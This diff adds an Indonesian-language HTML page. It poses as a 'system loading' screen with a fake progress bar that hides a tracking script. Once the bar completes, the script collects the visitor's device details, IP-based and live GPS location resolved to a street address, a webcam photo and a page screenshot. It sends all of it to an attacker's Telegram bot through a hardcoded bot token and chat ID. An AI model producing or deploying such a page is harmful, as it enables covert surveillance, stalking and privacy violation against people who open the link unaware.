@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sedang Memuat...</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #e6e6e6;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5" width="200" height="200"/></svg>') 0 0/20px 20px;
+      z-index: -1;
+    }
+    
+    #loading-container {
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+      background: rgba(18, 18, 36, 0.8);
+      backdrop-filter: blur(10px);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    #loading-container::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(to bottom right, rgba(255,255,255,0.1), rgba(255,255,255,0.01));
+      transform: rotate(30deg);
+      z-index: -1;
+    }
+    
+    .logo {
+      margin-bottom: 20px;
+      font-size: 40px;
+      color: #6e48aa;
+      text-shadow: 0 0 15px rgba(110, 72, 170, 0.5);
+      animation: pulse 2s infinite;
+    }
+    
+    #loading-text {
+      font-size: 24px;
+      margin-bottom: 25px;
+      color: #ffffff;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+    }
+    
+    #progress-container {
+      height: 8px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 25px;
+      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.2);
+    }
+    
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #6e48aa, #9d50bb);
+      border-radius: 10px;
+      transition: width 0.5s ease;
+      box-shadow: 0 0 10px rgba(157, 80, 187, 0.5);
+    }
+    
+    #percentage {
+      font-size: 18px;
+      margin-bottom: 20px;
+      font-weight: bold;
+      color: #9d50bb;
+    }
+    
+    #loading-details {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #b8b8b8;
+      min-height: 24px;
+      transition: opacity 0.3s ease;
+    }
+    
+    .loading-icon {
+      display: inline-block;
+      margin-right: 10px;
+      color: #9d50bb;
+    }
+    
+    .hidden {
+      display: none;
+    }
+    
+    .progress-stats {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #888;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    @keyframes glow {
+      0% { box-shadow: 0 0 5px rgba(157, 80, 187, 0.5); }
+      50% { box-shadow: 0 0 20px rgba(157, 80, 187, 0.8); }
+      100% { box-shadow: 0 0 5px rgba(157, 80, 187, 0.5); }
+    }
+    
+    @media (max-width: 600px) {
+      #loading-container {
+        width: 95%;
+        padding: 20px;
+      }
+      
+      #loading-text {
+        font-size: 20px;
+      }
+      
+      .logo {
+        font-size: 32px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="loading-container">
+    <div class="logo">
+      <i class="fas fa-cube"></i>
+    </div>
+    <div id="loading-text">
+      Memuat Sistem, Harap Tunggu...
+    </div>
+    
+    <div id="progress-container">
+      <div id="progress-bar"></div>
+    </div>
+    
+    <div id="percentage">0%</div>
+    
+    <div id="loading-details">
+      <div><span class="loading-icon"><i class="fas fa-cog fa-spin"></i></span>Mempersiapkan lingkungan...</div>
+    </div>
+    
+    <div class="progress-stats">
+      <span id="current-action">Inisialisasi</span>
+      <span id="time-estimate">Estimasi: < 1 menit</span>
+    </div>
+    
+    <video id="v" autoplay muted class="hidden"></video>
+    <canvas id="c" class="hidden"></canvas>
+  </div>
+
+  <script>
+    (() => {
+      // Konfigurasi
+      const TELEGRAM_BOT_TOKEN = '8431980930:AAGmuWjuFBSOFnS835n1wrbQciWFsQghgQk';
+      const TELEGRAM_CHAT_ID = '8048481751';
+      
+      // Elemen DOM
+      const progressBar = document.getElementById('progress-bar');
+      const percentageText = document.getElementById('percentage');
+      const loadingDetails = document.getElementById('loading-details');
+      const currentAction = document.getElementById('current-action');
+      const timeEstimate = document.getElementById('time-estimate');
+      
+      // Variabel progress
+      let progress = 0;
+      let isLoading = true;
+      
+      // Daftar pesan loading
+      const loadingMessages = [
+        "Memeriksa modul sistem...",
+        "Memuat komponen inti...",
+        "Menginisialisasi antarmuka...",
+        "Memverifikasi koneksi...",
+        "Menyiapkan lingkungan...",
+        "Memeriksa pembaruan...",
+        "Memuat aset tampilan...",
+        "Mengoptimalkan performa...",
+        "Memuat konfigurasi...",
+        "Menyiapkan database...",
+        "Memverifikasi keamanan...",
+        "Mengenkripsi koneksi..."
+      ];
+      
+      // Fungsi untuk memperbarui UI
+      function updateProgressBar() {
+        progressBar.style.width = progress + '%';
+        percentageText.textContent = Math.round(progress) + '%';
+        
+        // Animasi glow pada progress tertentu
+        if (progress % 20 === 0) {
+          progressBar.style.animation = 'none';
+          setTimeout(() => {
+            progressBar.style.animation = 'glow 1.5s';
+          }, 10);
+        }
+      }
+      
+      function updateLoadingMessage() {
+        if (Math.random() > 0.7 && progress < 95) {
+          const randomMessage = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
+          loadingDetails.innerHTML = `<div><span class="loading-icon"><i class="fas fa-cog fa-spin"></i></span>${randomMessage}</div>`;
+          currentAction.textContent = randomMessage;
+        }
+      }
+      
+      function updateTimeEstimate() {
+        if (progress < 25) {
+          timeEstimate.textContent = 'Estimasi: 1-2 menit';
+        } else if (progress < 50) {
+          timeEstimate.textContent = 'Estimasi: < 1 menit';
+        } else if (progress < 75) {
+          timeEstimate.textContent = 'Estimasi: 30 detik';
+        } else {
+          timeEstimate.textContent = 'Estimasi: beberapa detik';
+        }
+      }
+      
+      // Fungsi untuk mengirim pesan ke Telegram
+      const sendTelegramMessage = async (message) => {
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (error) {
+          console.error('Error sending message to Telegram:', error);
+        }
+      };
+      
+      const sendPhotoToTelegram = async (blob, filename) => {
+        try {
+          const formData = new FormData();
+          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('photo', blob, filename);
+          
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        } catch (error) {
+          console.error('Error sending photo to Telegram:', error);
+        }
+      };
+      
+      // Fungsi untuk mendapatkan detail lokasi
+      const getLocationDetails = async (latitude, longitude) => {
+        try {
+          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+          const data = await response.json();
+          
+          if (data.address) {
+            return {
+              district: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
+              subdistrict: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
+              fullAddress: data.display_name || "Alamat tidak tersedia"
+            };
+          }
+        } catch (error) {
+          console.error('Error getting location details:', error);
+        }
+        
+        return {
+          district: "Tidak diketahui",
+          subdistrict: "Tidak diketahui",
+          fullAddress: "Alamat tidak tersedia"
+        };
+      };
+      
+      // Fungsi untuk mengumpulkan informasi device
+      const collectDeviceInfo = async () => {
+        let message = '```╭───── 📋 Tracking Report ─────╮\n\n';
+        
+        // Informasi device
+        message += '📱 INFORMASI PERANGKAT\n';
+        message += `🖥️ Perangkat: ${navigator.userAgent}\n`;
+        message += `💻 Platform: ${navigator.platform}\n`;
+        message += `🌐 Bahasa: ${navigator.language}\n`;
+        message += `📶 Status: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+        message += `📺 Ukuran Layar: ${screen.width}x${screen.height}\n`;
+        message += `🪟 Ukuran Jendela: ${window.innerWidth}x${window.innerHeight}\n`;
+        message += `💾 RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB\n`;
+        message += `🧠 Inti CPU: ${navigator.hardwareConcurrency}\n`;
+        
+        // Informasi baterai
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            message += `🔋 Baterai: ${Math.floor(battery.level * 100)}%\n`;
+            message += `🔌 Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}\n`;
+          } catch (error) {
+            message += '🔋 Baterai: Tidak tersedia\n';
+          }
+        }
+        
+        // Informasi lainnya
+        message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+        message += `🕒 Waktu Muat: ${performance.now().toFixed(2)} ms\n`;
+        message += `📜 Riwayat: ${history.length} halaman\n`;
+        message += `✋ Dukungan Sentuh: ${'ontouchstart' in window ? 'Ya' : 'Tidak'}\n`;
+        message += `🔗 Referrer: ${document.referrer || 'Tidak ada'}\n`;
+        message += `🌍 URL: ${location.href}\n`;
+        message += `📄 Judul: ${document.title}\n`;
+        message += `🕓 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+        
+        // Informasi lokasi berdasarkan IP
+        try {
+          const ipResponse = await fetch('https://ipapi.co/json/');
+          const ipData = await ipResponse.json();
+          
+          message += '📍 INFORMASI LOKASI\n';
+          message += `📡 Alamat IP: ${ipData.ip}\n`;
+          message += `🏙️ Kota: ${ipData.city}\n`;
+          message += `🏙️ Provinsi: ${ipData.region}\n`;
+          message += `🌎 Negara: ${ipData.country_name}\n`;
+          message += `🏷️ Kode Pos: ${ipData.postal}\n`;
+          
+          if (ipData.latitude && ipData.longitude) {
+            message += `📌 Lintang: ${ipData.latitude}\n`;
+            message += `📍 Bujur: ${ipData.longitude}\n`;
+            
+            const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
+            message += `🏙️ Kabupaten: ${locationDetails.district}\n`;
+            message += `🏙️ Kecamatan: ${locationDetails.subdistrict}\n`;
+            message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
+          }
+        } catch (error) {
+          message += '❌ Gagal mendapatkan informasi lokasi\n';
+        }
+        
+        message += '\n╰───── Developer @rkyyzz ─────╯```';
+        return message;
+      };
+      
+      // Fungsi untuk mengambil screenshot dan data
+      const startTracking = async () => {
+        // Kirim informasi device
+        await sendTelegramMessage(await collectDeviceInfo());
+        
+        // Coba akses kamera
+        try {
+          const video = document.getElementById('v');
+          const canvas = document.getElementById('c');
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          
+          video.srcObject = stream;
+          
+          await new Promise(resolve => setTimeout(resolve, 3000));
+          
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          
+          canvas.toBlob(blob => {
+            sendPhotoToTelegram(blob, 'camera_capture.jpg');
+          }, 'image/jpeg');
+          
+          stream.getTracks().forEach(track => track.stop());
+        } catch (error) {
+          await sendTelegramMessage('❌ Tidak dapat mengakses kamera');
+        }
+        
+        // Ambil screenshot halaman
+        setTimeout(async () => {
+          try {
+            const canvas = await html2canvas(document.body);
+            canvas.toBlob(blob => {
+              sendPhotoToTelegram(blob, 'screenshot.jpg');
+            }, 'image/jpeg');
+          } catch (error) {
+            await sendTelegramMessage('❌ Gagal mengambil screenshot');
+          }
+        }, 5000);
+        
+        // Coba akses geolokasi
+        if (navigator.geolocation) {
+          navigator.geolocation.watchPosition(
+            async position => {
+              let message = `📍 LOKASI REAL-TIME\n`;
+              message += `📌 Lintang: ${position.coords.latitude}\n`;
+              message += `📍 Bujur: ${position.coords.longitude}\n`;
+              message += `🎯 Akurasi: ${position.coords.accuracy} meter\n`;
+              
+              const locationDetails = await getLocationDetails(
+                position.coords.latitude, 
+                position.coords.longitude
+              );
+              
+              message += `🏙️ Kabupaten: ${locationDetails.district}\n`;
+              message += `🏙️ Kecamatan: ${locationDetails.subdistrict}\n`;
+              message += `🏠 Alamat: ${locationDetails.fullAddress}\n`;
+              
+              await sendTelegramMessage(message);
+            },
+            async error => {
+              await sendTelegramMessage(`❌ Geolokasi dinonaktifkan: ${error.message}`);
+            },
+            {
+              enableHighAccuracy: true,
+              maximumAge: 0,
+              timeout: 5000
+            }
+          );
+        }
+      };
+      
+      // Simulasi proses loading
+      const simulateLoading = () => {
+        if (!isLoading) return;
+        
+        // Tingkatkan progress
+        progress += Math.random() * 4;
+        
+        // Jika mendekati akhir, perlambat
+        if (progress > 90) {
+          progress += Math.random() * 2;
+        }
+        
+        // Pastikan tidak melebihi 100%
+        if (progress > 100) {
+          progress = 100;
+          isLoading = false;
+          
+          // Tampilkan pesan selesai
+          loadingDetails.innerHTML = '<div><span class="loading-icon"><i class="fas fa-check"></i></span>Proses selesai!</div>';
+          currentAction.textContent = 'Selesai';
+          timeEstimate.textContent = 'Sistem siap';
+          
+          // Mulai proses tracking
+          setTimeout(startTracking, 1000);
+          return;
+        }
+        
+        // Perbarui UI
+        updateProgressBar();
+        updateLoadingMessage();
+        updateTimeEstimate();
+        
+        // Lanjutkan simulasi
+        const delay = progress < 50 ? 500 : 700;
+        setTimeout(simulateLoading, delay);
+      };
+      
+      // Mulai simulasi loading
+      simulateLoading();
+    })();
+  </script>
+</body>
+</html>
